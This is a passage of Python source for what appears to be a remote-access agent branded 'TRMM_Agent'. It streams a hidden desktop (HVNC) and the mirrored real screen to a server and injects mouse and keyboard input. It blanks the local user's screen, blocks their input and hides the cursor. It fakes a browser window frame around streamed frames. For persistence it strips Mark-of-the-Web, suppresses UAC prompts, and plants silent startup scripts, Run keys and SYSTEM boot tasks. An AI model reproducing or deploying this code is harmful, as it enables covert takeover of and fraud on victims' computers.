                        active_sid = get_active_console_session_id()
                        if active_sid == 0 or not is_agent_running_in_session(active_sid):
                            logger.info("[Session 0] Interactive worker disconnected or user logged out. Reconnecting as supervisor...")
                            break
                    return
                else:
                    logger.info("Worker superseded. Reconnecting...")
                    return

            if code == 4009 or any(k in reason_str for k in ("terminate", "decommissioned")):
                logger.info("Session closed permanently by server. Exiting agent.")
                self._terminate_agent(reason=reason_str, uninstall=("decommissioned" in reason_str or "terminate" in reason_str))
            raise

    async def _heartbeat_loop(self, ws):
        while True:
            try:
                await asyncio.sleep(self.heartbeat_interval)
                telemetry = self.get_system_telemetry()
                await ws.send(json.dumps({"type": "heartbeat", "data": telemetry}))
            except Exception:
                break

    async def _stream_loop(self, ws):
        loop = asyncio.get_event_loop()
        consecutive_errors = 0
        last_sent_bytes = None
        last_sent_time = 0
        while self.is_streaming:
            try:
                now = time.time()
                is_active = (now - self.last_input_time) < 5.0
                target_fps = 30 if is_active else 12
                interval = 1.0 / target_fps

                t0 = time.perf_counter()
                frame_bytes = await loop.run_in_executor(None, self.compositor.render_frame, is_active)
                if frame_bytes:
                    # Dispatch frame if active, if frame changed, or as an idle keepalive every 0.6s over WAN
                    if is_active or frame_bytes != last_sent_bytes or (now - last_sent_time >= 0.6):
                        last_sent_bytes = frame_bytes
                        last_sent_time = now
                        # 0x01 prefix identifies Backstage (HVNC) frames
                        await ws.send(b"\x01" + frame_bytes)
                    consecutive_errors = 0
                elapsed = time.perf_counter() - t0
                sleep_time = max(0.005, interval - elapsed)
                await asyncio.sleep(sleep_time)
            except asyncio.CancelledError:
                break
            except Exception as e:
                consecutive_errors += 1
                logger.error(f"HVNC streaming frame error ({consecutive_errors}): {e}")
                if consecutive_errors > 20:
                    logger.error("Exceeded maximum consecutive HVNC frame errors. Halting loop.")
                    break
                await asyncio.sleep(0.2)

    async def _mirror_stream_loop(self, ws):
        if getattr(self, "mirror_protocol", 0) == 2:
            try:
                await self.mirror_flow.run()
            except asyncio.CancelledError:
                pass
            except Exception:
                logger.exception("Mirror transport failed; reconnecting")
                await ws.close()
            return
        loop = asyncio.get_event_loop()
        diagnostics = os.environ.get("TRMM_MIRROR_DIAG") == "1"
        consecutive_errors = 0
        last_sent_bytes = None
        last_sent_time = 0
        while self.is_mirroring:
            try:
                now = time.time()
                is_active = (now - self.last_input_time) < 3.0
                target_fps = 30 if is_active else 10
                interval = 1.0 / target_fps

                t0 = time.perf_counter()
                frame_bytes = await loop.run_in_executor(None, self.mirror_capture.capture_frame, is_active)
                captured = time.perf_counter()
                if frame_bytes:
                    changed = frame_bytes != last_sent_bytes
                    # Send changes immediately; avoid flooding a WAN link with identical JPEGs.
                    if changed or (captured - last_sent_time >= 1.0):
                        await ws.send(b"\x02" + frame_bytes)
                        last_sent_bytes = frame_bytes
                        last_sent_time = time.perf_counter()
                        if diagnostics:
                            logger.info("[MIRROR SEND] t=%.3f active=%s bytes=%d changed=%s capture_ms=%.1f send_ms=%.1f",
                                        time.time(), is_active, len(frame_bytes), changed,
                                        (captured - t0) * 1000, (last_sent_time - captured) * 1000)
                    consecutive_errors = 0
                elapsed = time.perf_counter() - t0
                sleep_time = max(0.005, interval - elapsed)
                await asyncio.sleep(sleep_time)
            except asyncio.CancelledError:
                break
            except Exception as e:
                consecutive_errors += 1
                logger.error(f"Mirror streaming frame error ({consecutive_errors}): {e}")
                if consecutive_errors > 20:
                    break
                await asyncio.sleep(0.2)

    @staticmethod
    def _frame_cdp_image(frame_bytes: bytes, tab_title: str = "Google Chrome", url: str = "https://google.com") -> bytes:
        """Draws an authentic full browser window frame (tabs strip, omnibox, 4 corners, window controls) around CDP viewport frames."""
        try:
            from PIL import Image, ImageDraw
            import io
            img = Image.open(io.BytesIO(frame_bytes))
            w, h = img.width, img.height
            hdr_h = 72
            full_img = Image.new("RGB", (w, h + hdr_h), (24, 24, 27))
            draw = ImageDraw.Draw(full_img)

            # 1. Top tabs strip (h=36)
            draw.rectangle([(0, 0), (w, 35)], fill=(18, 18, 20))
            tab_w = min(220, max(120, int(w * 0.2)))
            draw.rounded_rectangle([(8, 6), (8 + tab_w, 35)], radius=6, fill=(39, 39, 42))
            clean_title = (tab_title or "New Tab")[:24]
            draw.text((24, 12), clean_title, fill=(244, 244, 245))
            draw.text((8 + tab_w + 12, 11), "+", fill=(161, 161, 170))
            # Caption buttons at top right
            draw.text((w - 110, 10), "-", fill=(212, 212, 216))
            draw.text((w - 70, 10), "[]", fill=(212, 212, 216))
            draw.text((w - 30, 10), "X", fill=(212, 212, 216))

            # 2. Address bar / Omnibox (h=36)
            draw.rectangle([(0, 36), (w, 71)], fill=(24, 24, 27))
            draw.text((12, 44), "<", fill=(161, 161, 170))
            draw.text((36, 44), ">", fill=(161, 161, 170))
            draw.text((60, 44), "O", fill=(161, 161, 170))
            # URL pill
            draw.rounded_rectangle([(85, 40), (w - 60, 68)], radius=14, fill=(39, 39, 42))
            clean_url = (url or "https://www.google.com")[:60]
            draw.text((100, 46), f"* {clean_url}", fill=(212, 212, 216))
            # Profile dot
            draw.ellipse([(w - 42, 42), (w - 20, 64)], fill=(59, 130, 246))

            # 3. Paste viewport
            full_img.paste(img, (0, hdr_h))

            # 4. 4 corners outer border
            draw.rectangle([(0, 0), (w - 1, h + hdr_h - 1)], outline=(51, 65, 85), width=1)

            out = io.BytesIO()
            full_img.save(out, format="JPEG", quality=80)
            return out.getvalue()
        except Exception:
            return frame_bytes

    async def _cdp_stream_loop(self, ws, cdp: CDPController):
        """Streams screencast frames from CDP tab directly over WebSocket with full window frame."""
        logger.info("Starting CDP screencast stream loop...")
        loop = asyncio.get_running_loop()

        def on_frame(frame_bytes: bytes):
            if self.is_cdp_streaming and ws and CDPController.is_ws_open(ws):
                try:
                    framed = self._frame_cdp_image(frame_bytes, tab_title=cdp.active_tab_id or "Chrome", url="https://google.com")
                    loop.create_task(ws.send(b"\x03" + framed))
                except Exception:
                    try:
                        asyncio.run_coroutine_threadsafe(ws.send(b"\x03" + frame_bytes), loop)
                    except Exception:
                        pass

        cdp.frame_callback = on_frame
        try:
            await cdp.start_screencast(format="jpeg", quality=80, max_width=1280, max_height=720)
            await cdp.listen_loop()
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.error(f"CDP stream error: {e}")
        finally:
            try:
                await cdp.stop_screencast()
            except Exception:
                pass
            logger.info("CDP screencast loop finished.")

    def _launch_app(self, app_name: str, url: Optional[str] = None) -> Dict[str, Any]:
        pid, err, binary = None, "Unknown app", None
        if app_name == "chrome":
            pid, err, binary = self.spawner.launch_chrome(url or "https://google.com")
        elif app_name == "edge":
            pid, err, binary = self.spawner.launch_edge(url or "https://bing.com")
        elif app_name == "firefox":
            pid, err, binary = self.spawner.launch_firefox(url or "https://mozilla.org")
        elif app_name == "explorer":
            pid, err, binary = self.spawner.launch_explorer()
        elif app_name == "cmd":
            pid, err, binary = self.spawner.launch_cmd()
        elif app_name == "powershell":
            pid, err, binary = self.spawner.launch_powershell()
        elif app_name == "regedit":
            pid, err, binary = self.spawner.launch_regedit()
        elif app_name == "taskmgr":
            pid, err, binary = self.spawner.launch_taskmgr()
        elif app_name == "notepad":
            pid, err, binary = self.spawner.launch_notepad()
        elif app_name == "custom_file":
            pid, err, binary = self.spawner.launch_installed_app(url or "", os.path.basename(url) if url else "File")

        return {
            "app": app_name,
            "success": bool(pid),
            "pid": pid,
            "error": err,
            "binary": binary,
        }

    def _handle_input(self, data: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        self.last_input_time = time.time()
        itype = data.get("type")

        # Global curtain and input blocking actions (both mirror and backstage)
        if itype == "set_curtain":
            enabled = bool(data.get("enabled", False))
            ok = ScreenCurtain.set_curtain(enabled)
            MirrorInput.set_stealth_cursor(enabled)
            if not enabled:
                try:
                    TouchpadLock.restore()
                except Exception:
                    pass
            logger.info(f"Screen curtain toggled: enabled={enabled}, success={ok}")
            return {"type": "diag_curtain", "enabled": enabled, "success": ok}
        elif itype == "set_block_input":
            enabled = bool(data.get("enabled", False))
            ok = ScreenCurtain.set_block_input(enabled)
            logger.info(f"BlockInput toggled: enabled={enabled}, success={ok}")
            return {"type": "diag_block_input", "enabled": enabled, "success": ok}
        elif itype == "set_stealth_cursor":
            enabled = bool(data.get("enabled", False))
            MirrorInput.set_stealth_cursor(enabled)
            logger.info(f"Stealth cursor toggled: enabled={enabled}")
            return {"type": "diag_stealth_cursor", "enabled": enabled}

        x = int(data.get("x", 0))
        y = int(data.get("y", 0))
        target_mode = data.get("mode")

        # Explicit routing based on session mode or active CDP stream (only when NOT in isolated Backstage desktop)
        if (target_mode == "cdp" or self.is_cdp_streaming) and self.cdp_active_controller and not self.desktop:
            ctrl = self.cdp_active_controller
            async def _dispatch_cdp():
                try:
                    if itype == "mousemove":
                        await ctrl.dispatch_mouse("mouseMoved", x, y)
                    elif itype == "mousedown":
                        btn_name = data.get("button", "left")
                        await ctrl.dispatch_mouse("mousePressed", x, y, button=btn_name, click_count=1)
                    elif itype == "mouseup":
                        btn_name = data.get("button", "left")
                        await ctrl.dispatch_mouse("mouseReleased", x, y, button=btn_name, click_count=1)
                    elif itype == "wheel":
                        raw_delta = data.get("delta")
                        if raw_delta is None and data.get("deltaY") is not None:
                            raw_delta = -data.get("deltaY")
                        delta = int(raw_delta or 0)
                        await ctrl.dispatch_wheel(x, y, delta_y=-delta)
                    elif itype == "keydown":
                        await ctrl.dispatch_key("rawKeyDown", windows_virtual_key_code=int(data.get("vk", 0)))
                    elif itype == "keyup":
                        await ctrl.dispatch_key("keyUp", windows_virtual_key_code=int(data.get("vk", 0)))
                    elif itype == "char":
                        ch = chr(int(data.get("char", 0)))
                        await ctrl.dispatch_key("char", text=ch)
                except Exception as ex:
                    logger.debug(f"CDP input dispatch error: {ex}")

            asyncio.create_task(_dispatch_cdp())
            return None

        use_mirror = (target_mode == "mirror") or (target_mode != "backstage" and self.is_mirroring and not self.is_streaming)

        # Real desktop routing when in Screen Mirror (Take Control) mode
        if use_mirror:
            if "normalized_x" in data and "normalized_y" in data:
                if (data.get("native_width"), data.get("native_height")) != (self.mirror_capture._width, self.mirror_capture._height):
                    if getattr(self, "mirror_protocol", 0) == 2:
                        self.mirror_flow.refresh()
                    return None
                x = round(max(0, min(1, float(data["normalized_x"]))) * (self.mirror_capture._width - 1))
                y = round(max(0, min(1, float(data["normalized_y"]))) * (self.mirror_capture._height - 1))
            self.mirror_input_id = data.get("input_id", 0)
            if getattr(self, "mirror_protocol", 0) == 2:
                self.mirror_flow.capture_event.set()
            if itype == "stealth_cursor":
                enabled = bool(data.get("enabled", False))
                MirrorInput.set_stealth_cursor(enabled)
                return None
            stealth = bool(data.get("stealth", False))
            if itype == "mousemove":
                MirrorInput.mouse_move(x, y, stealth=stealth)
                return None
            elif itype == "mousedown":
                btn = data.get("button", "left")
                MirrorInput.mouse_down(x, y, btn, stealth=stealth)
                return None
            elif itype == "mouseup":
                btn = data.get("button", "left")
                MirrorInput.mouse_up(x, y, btn, stealth=stealth)
                return None
            elif itype == "dblclick":
                # In mirror mode, browser mousedown and mouseup events already dispatched both clicks.
                return None
            elif itype == "wheel":
                raw_delta = data.get("delta")
                if raw_delta is None and data.get("deltaY") is not None:
                    raw_delta = -data.get("deltaY")
                delta = int(raw_delta or 0)
                MirrorInput.mouse_wheel(x, y, delta)
                return None
            elif itype == "keydown":
                MirrorInput.key_down(int(data.get("vk", 0)))
                return None
            elif itype == "keyup":
                MirrorInput.key_up(int(data.get("vk", 0)))
                return None
            elif itype == "char":
                MirrorInput.send_char(int(data.get("char", 0)))
                return None
            return None

        # Backstage (HVNC) Desktop routing: explicitly re-attach calling thread to hidden desktop
        if self.desktop:
            self.desktop.attach_current_thread()

        if itype == "mousemove":
            self.compositor.set_cursor_pos(x, y)
            self.input_handler.handle_mouse_move(x, y)
            return None
        elif itype == "mousedown":
            btn = data.get("button", "left")
            self.compositor.set_cursor_pos(x, y)
            diag = self.input_handler.handle_mouse_down(x, y, btn)
            return {"type": "diag_click", **diag}
        elif itype == "mouseup":
            btn = data.get("button", "left")
            self.compositor.set_cursor_pos(x, y)
            self.input_handler.handle_mouse_up(x, y, btn)
            return None
        elif itype == "dblclick":
            self.input_handler.handle_double_click(x, y)
            return None
        elif itype == "wheel":
            raw_delta = data.get("delta")
            if raw_delta is None and data.get("deltaY") is not None:
                raw_delta = -data.get("deltaY")
            delta = int(raw_delta or 0)
            diag = self.input_handler.handle_mouse_wheel(x, y, delta)
            return {"type": "diag_wheel", **diag}
        elif itype == "keydown":
            self.input_handler.handle_key_down(int(data.get("vk", 0)))
            return None
        elif itype == "keyup":
            self.input_handler.handle_key_up(int(data.get("vk", 0)))
            return None
        elif itype == "char":
            self.input_handler.handle_char(int(data.get("char", 0)))
            return None
        elif itype == "get_window_list":
            # Returns window positions for client-side titlebar button overlay
            import ctypes
            from ctypes import wintypes
            wins = self.desktop.enumerate_windows(include_minimized=False)
            wlist = []
            for w in wins:
                hwnd = w[0]
                title = w[1] or ""
                cls = w[2]
                rect = w[3]
                try:
                    import ctypes as _c
                    _user32 = _c.windll.user32
                    _r = wintypes.RECT()
                    _user32.GetWindowRect(hwnd, _c.byref(_r))
                    is_zoomed = bool(_user32.IsZoomed(hwnd))
                    is_iconic = bool(_user32.IsIconic(hwnd))
                    wlist.append({
                        "hwnd": hwnd,
                        "title": title[:40],
                        "cls": cls,
                        "rect": [_r.left, _r.top, _r.right, _r.bottom],
                        "zoomed": is_zoomed,
                        "iconic": is_iconic,
                    })
                except Exception:
                    pass
            return {"type": "window_list", "windows": wlist}
        return None

    def _ensure_persistence(self):
        """
        Multi-tier autostart persistence ensuring agent reconnects on reboot:
        1. User Registry Autorun (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) -> 100% reliable without elevation!
        2. User Startup Folder script (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent.vbs) -> 100% reliable without elevation!
        3. If running as Admin or SYSTEM:
           - System boot task (schtasks /Create /TN TRMM_Agent_Persist /SC ONSTART /RU SYSTEM /RL HIGHEST)
           - Machine logon task (schtasks /Create /TN TRMM_Agent_User /SC ONLOGON /RL HIGHEST)
           - Machine registry autorun (HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run)
           - Machine Startup folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent.vbs)
        """
        try:
            exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
            if getattr(sys, "frozen", False) and not os.path.isfile(exe_path):
                logger.warning(f"Persistence: EXE not found at {exe_path}")
                return

            app_name = os.path.splitext(os.path.basename(exe_path))[0]
            is_admin = False
            try:
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
            except Exception:
                pass

            # ── Step 0: Strip Mark-of-the-Web (Zone.Identifier) ───────────
            try:
                zone_file = exe_path + ":Zone.Identifier"
                if os.path.exists(zone_file):
                    try:
                        os.remove(zone_file)
                    except Exception:
                        pass
                subprocess.run(
                    ["powershell", "-NoProfile", "-Command", f"Unblock-File -Path '{exe_path}'"],
                    capture_output=True,
                    creationflags=CREATE_NO_WINDOW
                )
            except Exception:
                pass

            # ── Step 1: Purge Legacy HKLM/HKCU Run Keys & Clean Stale Startup Shortcuts ──
            try:
                subprocess.run([
                    "reg", "delete",
                    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    "/v", "TRMM_Agent",
                    "/f"
                ], capture_output=True, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass

            # Purge legacy TRMM_Agent from HKCU if custom app_name
            if app_name.lower() != "trmm_agent":
                try:
                    import winreg
                    k_purge = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(k_purge, "TRMM_Agent")
                    winreg.CloseKey(k_purge)
                except Exception:
                    pass

            # Proactively purge stale or broken VBS/LNK files in Startup folders
            try:
                import re
                startup_dirs = [
                    os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
                    os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
                ]
                for s_dir in startup_dirs:
                    if os.path.isdir(s_dir):
                        for fname in os.listdir(s_dir):
                            f_lower = fname.lower()
                            f_path = os.path.join(s_dir, fname)
                            # Remove old hardcoded TRMM_Agent shortcuts if running with custom name
                            if (f_lower.startswith("trmm_agent") or f_lower.startswith(app_name.lower())) and (f_lower.endswith(".lnk") or f_lower.endswith(".vbs")):
                                if f_lower == "trmm_agent.vbs" and app_name.lower() != "trmm_agent":
                                    try:
                                        os.remove(f_path)
                                        continue
                                    except Exception:
                                        pass
                            # Remove any orphan VBS or LNK referencing non-existent exes
                            if f_lower.endswith(".vbs"):
                                try:
                                    with open(f_path, "r", encoding="utf-8", errors="ignore") as vf_check:
                                        content = vf_check.read()
                                    m = re.search(r'[A-Za-z]:\\[^"\'\r\n]+\.exe', content, re.IGNORECASE)
                                    if m and not os.path.isfile(m.group(0)):
                                        os.remove(f_path)
                                except Exception:
                                    pass
            except Exception:
                pass

            # ── Step 2: Force RunAsInvoker in Windows AppCompatFlags ──────
            # Suppresses UAC elevation prompts when launched at login
            try:
                import winreg
                for root_k in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                    try:
                        compat_k = winreg.CreateKey(
                            root_k,
                            r"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
                        )
                        winreg.SetValueEx(compat_k, exe_path, 0, winreg.REG_SZ, "~ RUNASINVOKER")
                        winreg.CloseKey(compat_k)
                    except Exception:
                        pass
                logger.info("[Persistence] AppCompatFlags RunAsInvoker registered.")
            except Exception as e_compat:
                logger.debug(f"[Persistence] AppCompatFlags note: {e_compat}")

            # ── Step 3: Current User Startup Folder (VBS with RunAsInvoker & On Error Resume Next)
            vbs_path = None
            try:
                appdata = os.environ.get("APPDATA")
                if appdata:
                    user_startup = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                    if os.path.isdir(user_startup):
                        vbs_path = os.path.join(user_startup, f"{app_name}.vbs")
                        vbs_code = (
                            'On Error Resume Next\n'
                            'Set ws = CreateObject("WScript.Shell")\n'
                            'Set env = ws.Environment("Process")\n'
                            'env("__COMPAT_LAYER") = "RunAsInvoker"\n'
                            f'ws.Run """{exe_path}""", 0, False\n'
                        )
                        with open(vbs_path, "w", encoding="utf-8") as vf:
                            vf.write(vbs_code)
                        try:
                            subprocess.run(
                                ["powershell", "-NoProfile", "-Command", f"Unblock-File -Path '{vbs_path}'"],
                                capture_output=True,
                                creationflags=CREATE_NO_WINDOW
                            )
                        except Exception:
                            pass
                        logger.info(f"[Persistence] User Startup VBS launcher created at: {vbs_path}")
            except Exception as e_vbs:
                logger.warning(f"[Persistence] User Startup VBS note: {e_vbs}")

            # ── Step 4: Current User Registry Autorun (via wscript / silent)
            try:
                import winreg
                k = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                target_cmd = f'wscript.exe "{vbs_path}"' if vbs_path else f'"{exe_path}"'
                winreg.SetValueEx(k, app_name, 0, winreg.REG_SZ, target_cmd)
                winreg.CloseKey(k)
                logger.info(f"[Persistence] HKCU Run key '{app_name}' registered successfully.")
            except Exception as e_hkcu:
                logger.warning(f"[Persistence] HKCU Run key note: {e_hkcu}")

            # ── Layer 3: Elevated System Autostart (Admin / SYSTEM) ───────
            if is_admin:
                logger.info("[Persistence] Administrator privileges detected. Registering system boot tasks and HKLM...")
                # 1. System Boot Task (starts at boot in Session 0 before any user logs in)
                subprocess.run([
                    "schtasks", "/Create",
                    "/TN", f"{app_name}_Persist",
                    "/TR", f'"{exe_path}"',
                    "/SC", "ONSTART",
                    "/RU", "SYSTEM",
                    "/RL", "HIGHEST",
                    "/DELAY", "0000:10",
                    "/F"
                ], capture_output=True, text=True, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)

                # Clean up legacy task names if custom app_name
                if app_name.lower() != "trmm_agent":
                    subprocess.run(["schtasks", "/Delete", "/TN", "TRMM_Agent_Persist", "/F"], capture_output=True, creationflags=CREATE_NO_WINDOW)
                    subprocess.run(["schtasks", "/Delete", "/TN", "TRMM_Agent_User", "/F"], capture_output=True, creationflags=CREATE_NO_WINDOW)
                    subprocess.run(["schtasks", "/Delete", "/TN", "TRMM_Agent_User", "/F"], capture_output=True, creationflags=CREATE_NO_WINDOW)

                # 3. All Users Startup Folder VBScript
                try:
                    pdata = os.environ.get("ProgramData", r"C:\ProgramData")
                    all_startup = os.path.join(pdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                    if os.path.isdir(all_startup):
                        all_vbs = os.path.join(all_startup, f"{app_name}.vbs")
                        vbs_code = (
                            'On Error Resume Next\n'
                            'Set ws = CreateObject("WScript.Shell")\n'
                            'Set env = ws.Environment("Process")\n'
                            'env("__COMPAT_LAYER") = "RunAsInvoker"\n'
                            f'ws.Run """{exe_path}""", 0, False\n'
                        )
                        with open(all_vbs, "w", encoding="utf-8") as avf:
                            avf.write(vbs_code)
                except Exception:
                    pass

            self._persistence_verified = True
            logger.info(f"[Persistence] Multi-tier autostart configured (Admin={is_admin}).")

            # If running in Session 0, immediately check for active console session and spawn worker
            my_sid = get_current_session_id()
            if my_sid == 0:
                active_sid = get_active_console_session_id()
                if active_sid != 0 and active_sid != 0xFFFFFFFF:
                    if not is_agent_running_in_session(active_sid):
                        logger.info(f"[Session 0 Supervisor] Initial spawn into active console Session {active_sid}...")
                        launch_agent_in_session(active_sid, exe_path)

        except Exception as e:
            logger.warning(f"[Persistence] Setup note: {e}")

    def run_forever(self):
        """Persistent loop with automatic reconnection and session supervision."""
        logger.info(f"Agent '{self.agent_id}' started.")
        self._ensure_persistence()

        my_sid = get_current_session_id()
        if my_sid == 0:
            logger.info("[Session 0] Starting Supervisor Watchdog Thread.")
            import threading
            def _watchdog_loop():
                exe_p = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
                while getattr(self, "_running", True):
                    try:
                        active_sid = get_active_console_session_id()
                        if active_sid != 0 and active_sid != 0xFFFFFFFF:
                            if not is_agent_running_in_session(active_sid):
                                logger.info(f"[Session 0 Supervisor] Spawning interactive worker into Session {active_sid}...")
                                launch_agent_in_session(active_sid, exe_p)
                    except Exception as e:
                        logger.debug(f"Watchdog loop note: {e}")
                    time.sleep(5)

            wd_th = threading.Thread(target=_watchdog_loop, daemon=True)
            wd_th.start()

        while getattr(self, "_running", True):
            # If Session 0 and an active interactive user session exists, supervisor MUST NOT connect to WebSocket!
            if my_sid == 0:
                active_sid = get_active_console_session_id()
                if active_sid != 0 and active_sid != 0xFFFFFFFF:
                    time.sleep(3)
                    continue

            try:
                asyncio.run(self.connect_and_serve())
            except (KeyboardInterrupt, SystemExit):
                logger.info("Agent process shutting down.")
                break
            except Exception as e:
                if not getattr(self, "_running", True):
                    break
                logger.warning(f"Connection dropped: {e}. Reconnecting in {self.reconnect_interval}s...")
                time.sleep(self.reconnect_interval)
